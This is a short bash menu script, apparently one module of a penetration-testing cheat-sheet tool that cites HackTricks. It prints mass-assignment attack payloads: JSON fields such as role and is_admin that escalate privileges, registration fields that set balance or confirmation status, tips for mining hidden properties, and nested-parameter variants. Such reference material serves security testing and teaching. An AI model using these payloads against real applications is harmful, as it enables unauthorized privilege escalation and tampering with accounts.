#!/bin/bash
# HackTricks Ref: mass-assignment.md
# Module: Mass Assignment / Parameter Binding

echo -e "${C6}[WEB ATTACK: MASS_ASSIGNMENT]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/mass-assignment"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Mass Assignment Vector:${NC}"
echo "1) Profile Update Exploitation (Privilege Escalation)"
echo "2) Account Creation Over-binding"
echo "3) Discover Hidden Fields (Property Mining)"
echo "4) JSON/BSON Specific Payloads"
echo "0) Exit"

read -p "Selection: " ma_opt

case $ma_opt in
    1)
        echo -e "\n${C2}[*] Privilege Escalation via Profile Update:${NC}"
        echo "When updating your profile, add administrative fields to the JSON body:"
        echo "Original: {\"username\":\"bob\", \"email\":\"bob@mail.com\"}"
        echo "Payload:  {\"username\":\"bob\", \"email\":\"bob@mail.com\", \"role\":\"admin\", \"is_admin\":true}"
        echo "Common fields: role, admin, permissions, group_id, verified"
        ;;
    2)
        echo -e "\n${C2}[*] Account Creation Over-binding:${NC}"
        echo "During registration, try to set internal state variables:"
        echo " - {\"user\":{\"username\":\"hacker\", \"password\":\"123\", \"balance\":99999}}"
        echo " - {\"user\":{\"username\":\"hacker\", \"confirmed\":true}}"
        ;;
    3)
        echo -e "\n${C2}[*] Property Mining:${NC}"
        echo "How to find hidden properties?"
        echo " - Check the 'GET' response for the object; it often reveals internal fields."
        echo " - Guess common names: 'admin', 'superuser', 'owner_id', 'plan_type'."
        echo " - If the app uses Java/Spring, look for 'class' or 'id' fields."
        ;;
    4)
        echo -e "\n${C2}[*] Format Specific Payloads:${NC}"
        echo "Sometimes the backend expects a flat structure but allows nested objects:"
        echo " - user[admin]=1"
        echo " - {\"user.admin\": true}"
        echo " - {\"attributes\": {\"is_vip\": true}}"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
